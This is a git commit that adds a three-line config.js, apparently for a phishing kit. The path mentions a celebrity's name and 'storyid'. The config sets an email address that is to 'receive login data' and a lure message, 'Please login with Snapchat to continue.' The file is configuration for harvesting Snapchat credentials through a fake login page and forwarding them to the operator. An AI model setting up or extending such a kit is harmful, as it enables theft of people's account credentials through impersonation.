b69d59e056d2edc4e8e75022249da43b0a0017a4
Daniel Warren <32231101+captain-snuffels@users.noreply.github.com>
2017-09-24 14:25:32 +0000

    Created new files

---
+++ kyliej/auth/latest/storyid/config.js
@@ -0,0 +1,3 @@
+var email = "captain-snuffels@secmail.pro";  // The E-mail address to where you want to receive login data
+var custom_login_message = "Please login with Snapchat to continue.";  // Specify a custom message to display on the login page
+
